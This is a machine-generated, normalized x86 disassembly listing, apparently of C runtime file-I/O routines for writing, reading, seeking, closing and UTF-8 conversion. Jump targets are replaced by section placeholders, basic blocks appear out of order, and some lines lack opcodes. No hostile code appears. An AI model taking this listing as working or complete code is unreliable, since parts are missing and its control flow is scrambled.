lea edi [ ebp - 0x1404 ]
jmp r-xdata
lea eax [ ebp - 0x1404 ]
sub edi eax
lea eax [ ebp - 0x140c ]
push 0x0
push eax
and edi 0xfffffffe
lea eax [ ebp - 0x1404 ]
push edi
push eax
push ecx
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx eax [ ebx ]
add ebx 0x2
cmp eax 0xa
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn
call [ GetLastError@IAT ]
mov [ esi ] eax
mov eax [ ebp - 0x140c ]
add [ esi + 0x4 ] eax
cmp eax edi
jb r-xdata
mov [ edi ] ax
lea eax [ ebp - 0x6 ]
add edi 0x2
cmp edi eax
mov eax [ ebp - 0x1408 ]
jb r-xdata
add [ esi + 0x8 ] 0x2
push 0xd
pop edx
mov [ edi ] dx
add edi 0x2
mov eax [ ebp - 0x1408 ]
mov ecx [ ebp - 0x1410 ]
cmp ebx eax
jae r-xdata
sub_41cefa
mov edi edi
push ebp
mov ebp esp
mov eax 0x1418
call sub_429c10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
mov eax ecx
sar eax 0x6
and ecx 0x3f
imul ecx ecx 0x30
push ebx
push esi
mov eax [ eax * 4 + rw-data ]
xor ebx ebx
mov esi [ ebp + 0x8 ]
push edi
mov eax [ eax + ecx + 0x18 ]
mov ecx [ ebp + 0x10 ]
mov edi ecx
mov [ ebp - 0x1414 ] eax
mov eax [ ebp + 0x14 ]
add eax ecx
mov [ esi ] ebx
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x140c ] eax
mov [ esi + 0x8 ] ebx
cmp ecx eax
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x140c ]
lea eax [ ebp - 0x6b0 ]
push ebx
push ebx
push 0xd55
lea ecx [ ebp - 0x1408 ]
push ecx
lea ecx [ ebp - 0x6b0 ]
sub eax ecx
sar eax 0x1
push eax
mov eax ecx
push eax
push ebx
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1418 ] eax
test eax eax
je r-xdata
movzx ecx [ edi ]
add edi 0x2
cmp ecx 0xa
jne r-xdata
call [ GetLastError@IAT ]
mov [ esi ] eax
push 0x0
lea ecx [ ebp - 0x1410 ]
sub eax ebx
push ecx
push eax
lea eax [ ebp - 0x1408 ]
add eax ebx
push eax
push [ ebp - 0x1414 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov [ eax ] cx
add eax 0x2
lea ecx [ ebp - 0x8 ]
cmp eax ecx
jb r-xdata
push 0xd
pop edx
mov [ eax ] dx
add eax 0x2
add ebx [ ebp - 0x1410 ]
mov eax [ ebp - 0x1418 ]
cmp ebx eax
jb r-xdata
cmp edi esi
jae r-xdata
mov eax edi
sub eax [ ebp + 0x10 ]
mov [ esi + 0x4 ] eax
cmp edi [ ebp - 0x140c ]
jae r-xdata
xor ebx ebx
jmp r-xdata
sub_41d027
push 0x14
push r--data
call sub_40e2a0
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_41528b
and [ eax ] 0x0
call sub_41529e
mov [ eax ] 0x9
jmp r-xdata
call sub_41528b
and [ eax ] 0x0
call sub_41529e
mov [ eax ] 0x9
call sub_413b01
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x6
mov eax esi
and eax 0x3f
imul ecx eax 0x30
mov [ ebp - 0x20 ] ecx
mov eax [ ebx * 4 + rw-data ]
movzx eax [ eax + ecx + 0x28 ]
and eax 0x1
je r-xdata
push esi
call sub_41f919
pop ecx
or edi 0xffffffff
mov [ ebp - 0x1c ] edi
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
mov ecx [ ebp - 0x20 ]
test [ eax + ecx + 0x28 ] 0x1
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_41d112
add esp 0xc
mov edi eax
mov [ ebp - 0x1c ] edi
call sub_41529e
mov [ eax ] 0x9
call sub_41528b
and [ eax ] 0x0
jmp r-xdata
call sub_40e2e6
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41d0e9
mov eax edi
jmp r-xdata
sub_41d112
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x30 ] edi
test ecx ecx
jne r-xdata
test edi edi
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
mov eax esi
mov ebx esi
sar ebx 0x6
and eax 0x3f
imul edx eax 0x30
mov [ ebp - 0x1c ] ebx
mov eax [ ebx * 4 + rw-data ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x18 ] edx
mov bl [ eax + edx + 0x29 ]
cmp bl 0x2
je r-xdata
call sub_41528b
and [ eax ] edi
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn
mov eax ecx
not eax
test al 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
mov eax [ ebp - 0x2c ]
call sub_41528b
and [ eax ] 0x0
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
jmp r-xdata
test [ eax + edx + 0x28 ] 0x20
je r-xdata
push esi
call sub_41ccb7
pop ecx
test al al
je r-xdata
push 0x2
push 0x0
push 0x0
push esi
call sub_41da40
add esp 0x10
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax * 4 + rw-data ]
mov eax [ ebp - 0x18 ]
test [ ecx + eax + 0x28 ] 0x80
je r-xdata
test bl bl
je r-xdata
pop ebx
mov eax [ ecx + eax + 0x18 ]
xor ecx ecx
push ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
lea ecx [ ebp - 0x10 ]
push ecx
push [ ebp - 0x8 ]
push edi
push eax
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
movsx eax bl
sub eax 0x0
je r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x14 ]
push edi
push esi
push eax
call sub_41ca97
dec bl
cmp bl 0x1
ja r-xdata
lea esi [ ebp - 0x14 ]
call [ GetLastError@IAT ]
mov [ ebp - 0x14 ] eax
push [ ebp - 0x8 ]
lea eax [ ebp - 0x14 ]
push edi
push esi
push eax
call sub_41cd2d
jmp r-xdata
sub eax 0x1
je r-xdata
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x18 ]
mov eax [ eax * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x40
je r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x14 ]
push edi
push eax
call sub_41cc4a
add esp 0xc
sub eax [ ebp - 0x20 ]
mov eax [ ebp - 0x28 ]
test eax eax
je r-xdata
add esp 0x10
jmp r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x14 ]
push edi
push esi
push eax
call sub_41cefa
jmp r-xdata
sub eax 0x1
jne r-xdata
lea edi [ ebp - 0x28 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x24 ]
test eax eax
jne r-xdata
call sub_41529e
mov [ eax ] 0x1c
call sub_41528b
and [ eax ] 0x0
cmp [ edi ] 0x1a
jne r-xdata
mov edi [ ebp - 0x30 ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x14 ]
push edi
push esi
push eax
call sub_41ce0c
jmp r-xdata
xor eax eax
jmp r-xdata
push eax
call sub_415268
pop ecx
jmp r-xdata
call sub_41529e
mov [ eax ] 0x9
call sub_41528b
mov [ eax ] esi
jmp r-xdata
sub_41d31e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
lea edi [ esi + 0xc ]
mov eax [ edi ]
shr eax 0xd
test al 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ edi ]
shr eax 0x6
test al 0x1
je r-xdata
push [ esi + 0x4 ]
call sub_41a3a5
pop ecx
mov eax 0xfffffebf
[ edi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi ] eax
mov [ esi + 0x8 ] eax
sub_41d35c
push 0x10
push r--data
call sub_40e2a0
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
jne r-xdata
xor esi esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] esi
push [ ebp + 0x8 ]
call sub_416c9b
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call sub_41d3d8
pop ecx
mov esi eax
mov [ ebp - 0x20 ] esi
mov edi edx
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41d3ce
mov eax esi
mov edx edi
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
or edx 0xffffffff
mov eax edx
jmp r-xdata
call sub_40e2e6
retn
sub_41d3d8
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
push [ ebp + 0x8 ]
call sub_41b8cf
pop ecx
mov ecx [ ebp + 0x8 ]
mov esi eax
xor eax eax
cmp [ ecx + 0x8 ] eax
jge r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
or eax 0xffffffff
or edx eax
jmp r-xdata
push ebx
push edi
push 0x1
push eax
push eax
push esi
call sub_41da25
mov ebx edx
add esp 0x10
mov edi eax
mov [ ebp - 0x8 ] edi
test ebx ebx
jg r-xdata
mov [ ecx + 0x8 ] eax
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
test al 0xc0
jne r-xdata
jl r-xdata
mov eax esi
and esi 0x3f
sar eax 0x6
imul ecx esi 0x30
mov [ ebp - 0xc ] eax
mov eax [ eax * 4 + rw-data ]
mov [ ebp - 0x10 ] ecx
mov al [ ecx + eax + 0x29 ]
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x1 ] al
mov eax [ ecx ]
sub eax [ ecx + 0x4 ]
mov ecx [ ecx + 0xc ]
cdq
mov esi eax
test cl 0x3
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cdq
sub edi eax
mov eax edi
sbb ebx edx
mov edx ebx
jmp r-xdata
or eax 0xffffffff
or edx eax
jmp r-xdata
test edi edi
jb r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
shr eax 0x2
test al 0x1
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
mov ecx [ ebp - 0xc ]
jne r-xdata
pop edi
pop ebx
pop esi
mov eax [ ebp + 0x8 ]
call sub_41529e
mov [ eax ] 0x16
mov eax [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x10 ]
test [ ecx + eax + 0x28 ] 0x80
je r-xdata
mov edi [ ebp - 0x10 ]
mov eax [ ecx * 4 + rw-data ]
test [ edi + eax + 0x2d ] 0x2
mov edi [ ebp - 0x8 ]
je r-xdata
mov eax esi
mov eax [ eax + 0xc ]
test al 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
mov ecx [ eax ]
sub ecx [ eax + 0x4 ]
mov edi [ eax + 0x4 ]
cmp [ eax ] edi
sbb edi edi
not edi
and edi ecx
mov [ ebp - 0xc ] edi
mov edi [ ebp - 0x8 ]
je r-xdata
push ebx
push edi
push [ ebp + 0x8 ]
call sub_41d6f1
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
push edx
push esi
push ebx
push edi
push [ ebp + 0x8 ]
call sub_41d56d
add esp 0x14
jmp r-xdata
mov ecx edi
or ecx ebx
je r-xdata
mov ecx [ eax + 0x4 ]
mov edi [ ebp - 0x10 ]
add esi edi
adc edx ebx
push 0x0
push 0x2
push edx
push esi
call sub_429c40
mov esi eax
inc ecx
inc edi
cmp edi [ ebp - 0xc ]
jne r-xdata
add esi 0x1
adc edx 0x0
cmp [ ecx ] 0xa
jne r-xdata
mov edi [ ebp - 0x8 ]
jmp r-xdata
sub_41d56d
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push edi
push [ ebp + 0x8 ]
call sub_41b8cf
pop ecx
mov ecx eax
mov [ ebp - 0xc ] eax
mov edx eax
mov [ ebp - 0x8 ] 0x2
sar edx 0x6
and ecx 0x3f
imul ecx ecx 0x30
xor edi edi
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] edi
mov eax [ edx * 4 + rw-data ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x10 ] ecx
cmp [ eax + ecx + 0x29 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x14 ] ecx
test ecx ecx
jne r-xdata
mov [ ebp - 0x8 ] 0x1
mov ecx [ eax ]
sub ecx [ eax + 0x4 ]
push ebx
mov eax ecx
mov ecx [ ebp - 0x10 ]
cdq
push esi
mov esi eax
mov ebx edx
mov eax [ ebp - 0x14 ]
cdq
add esi eax
mov eax [ ebp - 0x18 ]
adc ebx edx
test [ eax + ecx + 0x28 ] 0x80
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
jmp r-xdata
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push ebx
push esi
call sub_429c40
push [ ebp - 0x4 ]
mov edi edx
mov esi eax
push [ ebp - 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
call sub_429c40
sub eax esi
sbb edx edi
add eax [ ebp + 0xc ]
adc edx [ ebp + 0x10 ]
push 0x2
push edi
push edi
push [ ebp - 0xc ]
call sub_41da25
add esp 0x10
cmp eax [ ebp + 0xc ]
jne r-xdata
pop edi
mov esp ebp
pop ebp
retn
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0xc ]
call sub_41da25
and eax edx
add esp 0x10
or edx 0xffffffff
cmp eax edx
jne r-xdata
cmp edx [ ebp + 0x10 ]
jne r-xdata
cmp ebx edi
jg r-xdata
mov eax edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] edi
mov edx [ eax + 0x4 ]
add edx esi
mov ecx edx
sub ecx [ eax + 0x4 ]
cmp edx [ eax + 0x4 ]
sbb edx edx
not edx
and edx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x18 ]
cdq
mov esi eax
mov ebx edx
mov ecx 0x200
jl r-xdata
pop esi
pop ebx
mov eax [ eax + 0xc ]
shr eax 0x5
test al 0x1
jmp r-xdata
mov ecx [ eax + 0x4 ]
add esi 0x1
adc ebx edi
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
shr eax 0x6
test al 0x1
je r-xdata
cmp esi ecx
ja r-xdata
je r-xdata
inc ecx
inc [ ebp - 0xc ]
cmp [ ebp - 0xc ] edx
jne r-xdata
add esi 0x1
adc ebx edi
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
shr eax 0x8
test al 0x1
jne r-xdata
cmp [ ecx ] 0xa
jne r-xdata
mov esi ecx
mov ebx edi
jmp r-xdata
mov ecx [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
mov ecx [ ecx * 4 + rw-data ]
test [ ecx + eax + 0x28 ] 0x4
sub_41d6f1
mov edi edi
push ebp
mov ebp esp
mov eax 0x1018
call sub_429c10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push [ ebp + 0x8 ]
call sub_41b8cf
pop ecx
mov ecx [ ebp + 0x8 ]
mov ebx eax
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ ecx ]
sub eax [ ecx + 0x4 ]
push esi
push edi
push 0x0
cdq
push 0x2
push edx
push eax
call sub_429c40
mov ecx ebx
mov [ ebp - 0x1008 ] eax
and ecx 0x3f
mov [ ebp - 0x1018 ] edx
mov esi ebx
imul edi ecx 0x30
sar esi 0x6
push 0x0
mov ecx [ esi * 4 + rw-data ]
push [ ecx + edi + 0x24 ]
push [ ecx + edi + 0x20 ]
push ebx
call sub_41da25
mov ecx [ esi * 4 + rw-data ]
add esp 0x10
mov [ ebp - 0x100c ] eax
mov eax edx
mov edx [ ebp - 0x100c ]
mov [ ebp - 0x1014 ] eax
cmp edx [ ecx + edi + 0x20 ]
jne r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
jmp r-xdata
or eax 0xffffffff
or edx eax
cmp eax [ ecx + edi + 0x24 ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn
push 0x0
lea eax [ ebp - 0x1010 ]
push eax
push 0x1000
lea eax [ ebp - 0x1004 ]
push eax
push [ ecx + edi + 0x18 ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_41da25
add esp 0x10
test edx edx
jg r-xdata
mov ebx [ ebp - 0x1018 ]
mov eax [ ebp - 0x1010 ]
test ebx ebx
jl r-xdata
jl r-xdata
lea edi [ ebp - 0x1004 ]
xor edx edx
add edi eax
lea ecx [ ebp - 0x1004 ]
xor esi esi
cmp [ ebp - 0x1008 ] edx
jne r-xdata
jg r-xdata
test eax eax
jb r-xdata
cmp ecx edi
jae r-xdata
test ebx ebx
je r-xdata
cmp [ ebp - 0x1008 ] eax
ja r-xdata
lea eax [ ebp - 0x1004 ]
sub ecx eax
mov eax ecx
cdq
add eax [ ebp - 0x100c ]
adc edx [ ebp - 0x1014 ]
jmp r-xdata
mov al [ ecx ]
cmp al 0xd
jne r-xdata
pop edi
pop esi
movzx eax al
movsx eax [ eax + rw-data ]
add ecx eax
lea eax [ edi - 0x1 ]
cmp ecx eax
jae r-xdata
cmp edx ebx
jne r-xdata
add esi 0x1
adc edx 0x0
inc ecx
cmp esi [ ebp - 0x1008 ]
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov ecx eax
jmp r-xdata
sub_41d8a2
push 0x1c
push r--data
call sub_40e2a0
mov edi [ ebp + 0x8 ]
cmp edi 0xfffffffe
jne r-xdata
test edi edi
js r-xdata
call sub_41528b
and [ eax ] 0x0
call sub_41529e
mov [ eax ] 0x9
jmp r-xdata
call sub_41528b
and [ eax ] 0x0
call sub_41529e
mov [ eax ] 0x9
call sub_413b01
cmp edi [ rw-data ]
jae r-xdata
or esi 0xffffffff
mov edx esi
mov ecx edi
sar ecx 0x6
mov [ ebp - 0x1c ] ecx
mov eax edi
and eax 0x3f
imul edx eax 0x30
mov [ ebp - 0x20 ] edx
mov eax [ ecx * 4 + rw-data ]
movzx eax [ eax + edx + 0x28 ]
and eax 0x1
je r-xdata
push edi
call sub_41f919
pop ecx
or esi 0xffffffff
mov [ ebp - 0x2c ] esi
mov ebx esi
mov [ ebp - 0x28 ] ebx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x1c ]
mov eax [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x20 ]
test [ eax + ecx + 0x28 ] 0x1
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_41d9a7
add esp 0x10
mov esi eax
mov [ ebp - 0x2c ] esi
mov ebx edx
mov [ ebp - 0x28 ] ebx
call sub_41529e
mov [ eax ] 0x9
call sub_41528b
and [ eax ] 0x0
jmp r-xdata
mov eax esi
call sub_40e2e6
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41d97a
mov edx ebx
jmp r-xdata
sub_41d9a7
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_41fb96
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ SetFilePointerEx@IAT ]
test eax eax
jne r-xdata
call sub_41529e
mov [ eax ] 0x9
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
and eax edx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
push eax
call sub_415268
pop ecx
jmp r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax edi
mov edx edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx esi
and esi 0x3f
sar ecx 0x6
imul esi esi 0x30
mov ecx [ ecx * 4 + rw-data ]
and [ ecx + esi + 0x28 ] 0xfd
sub_41da5b
push 0x10
push r--data
call sub_40e2a0
and [ ebp - 0x1c ] 0x0
push 0x8
call sub_4191c3
pop ecx
and [ ebp - 0x4 ] 0x0
push 0x3
pop esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41daf2
mov eax [ ebp - 0x1c ]
call sub_40e2e6
retn
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
inc esi
jmp r-xdata
mov eax [ eax + 0xc ]
shr eax 0xd
test al 0x1
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_41a3a5
pop ecx
mov eax [ rw-data ]
and [ eax + esi * 4 ] 0x0
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_416d39
pop ecx
cmp eax 0xffffffff
je r-xdata
inc [ ebp - 0x1c ]
sub_41dafb
push 0xc
push r--data
call sub_40e2a0
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_41f919
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov esi [ eax ]
mov edx esi
sar edx 0x6
mov eax esi
and eax 0x3f
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x1
je r-xdata
call sub_41529e
mov [ eax ] 0x9
or esi 0xffffffff
push esi
call sub_41dc24
pop ecx
mov esi eax
jmp r-xdata
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41db71
mov eax esi
call sub_40e2e6
retn 0xc
sub_41db7d
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_41dafb
mov esp ebp
pop ebp
retn
sub_41dba5
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_41528b
and [ eax ] 0x0
call sub_41529e
mov [ eax ] 0x9
jmp r-xdata
call sub_41528b
and [ eax ] 0x0
call sub_41529e
mov [ eax ] 0x9
call sub_413b01
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov eax esi
mov edx esi
and eax 0x3f
sar edx 0x6
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x1
je r-xdata
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
push esi
call sub_41db7d
pop ecx
pop ecx
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
sub_41dc24
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
call sub_41fb96
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov eax [ rw-data ]
cmp edi 0x1
jne r-xdata
xor esi esi
jmp r-xdata
cmp edi 0x2
jne r-xdata
test [ eax + 0x88 ] 0x1
jne r-xdata
push edi
call sub_41fb05
pop ecx
mov ecx edi
and edi 0x3f
sar ecx 0x6
imul edx edi 0x30
mov ecx [ ecx * 4 + rw-data ]
mov [ ecx + edx + 0x28 ] 0x0
test esi esi
je r-xdata
push edi
call sub_41fb96
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x58 ] 0x1
je r-xdata
push 0x2
call sub_41fb96
push 0x1
mov esi eax
call sub_41fb96
pop ecx
pop ecx
cmp eax esi
je r-xdata
xor eax eax
push esi
call sub_415268
pop ecx
or eax 0xffffffff
jmp r-xdata
call [ GetLastError@IAT ]
mov esi eax
pop edi
pop esi
pop ebp
retn
sub_41dcc0
push 0xc
push r--data
call sub_40e2a0
xor edi edi
mov esi [ ebp + 0x8 ]
mov [ esi ] edi
push 0x8
call sub_4191c3
pop ecx
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x1c ]
push eax
call sub_41dd5a
pop ecx
mov eax [ eax ]
mov [ esi ] eax
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41dd16
mov eax esi
call sub_40e2e6
retn
mov [ eax + 0x8 ] edi
mov [ eax + 0x1c ] edi
mov [ eax ] edi
mov [ eax + 0x4 ] edi
or [ eax + 0x10 ] 0xffffffff
sub_41dd1f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov [ eax ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] ecx
mov eax [ ebp + 0x8 ]
or [ eax + 0x10 ] 0xffffffff
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x18 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] ecx
mov eax [ ebp + 0x8 ]
add eax 0xc
xchg [ eax ] ecx
pop ebp
retn
sub_41dd5a
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ rw-data ]
push esi
push edi
mov edi [ rw-data ]
add edi 0xc
add ebx 0xfffffffd
lea ebx [ edi + ebx * 4 ]
mov [ ebp - 0x4 ] ebx
jmp r-xdata
cmp edi ebx
jne r-xdata
mov esi [ edi ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax ] 0x0
push 0x38
push 0x1
call sub_41942e
push 0x0
mov [ edi ] eax
call sub_41a3a5
mov eax [ edi ]
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
shr eax 0xd
test al 0x1
jne r-xdata
or [ eax + 0x10 ] 0xffffffff
mov eax [ edi ]
push 0x0
push 0xfa0
add eax 0x20
push eax
call sub_41c164
mov esi [ edi ]
mov ecx 0x2000
lea eax [ esi + 0xc ]
[ eax ] ecx
push esi
call sub_416c9b
pop ecx
jmp r-xdata
add edi 0x4
push esi
call sub_416c9b
pop ecx
lea edx [ esi + 0xc ]
mov ebx 0x2000
mov eax [ edx ]
mov eax [ ebp + 0x8 ]
mov [ eax ] esi
jmp r-xdata
mov ecx eax
or ecx ebx
[ edx ] ecx
jne r-xdata
mov ebx [ ebp - 0x4 ]
shr eax 0xd
not al
test al 0x1
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
call sub_416caf
pop ecx
sub_41de1d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_414048
mov eax [ ebp - 0xc ]
movzx ecx [ ebp + 0x8 ]
mov eax [ eax ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_41de56
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x18 ]
push edi
test esi esi
jle r-xdata
mov edi [ ebp + 0x24 ]
test edi edi
jne r-xdata
push esi
push [ ebp + 0x14 ]
call sub_41a389
pop ecx
cmp eax esi
pop ecx
lea esi [ eax + 0x1 ]
jl r-xdata
xor eax eax
cmp [ ebp + 0x28 ] eax
push 0x0
push 0x0
push esi
push [ ebp + 0x14 ]
setne al
lea eax [ eax * 8 + 0x1 ]
push eax
push edi
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov edi [ eax + 0x8 ]
mov [ ebp + 0x24 ] edi
mov esi eax
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
lea edx [ eax + eax ]
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
test ecx eax
je r-xdata
xor ebx ebx
lea ecx [ edx + 0x8 ]
cmp edx ecx
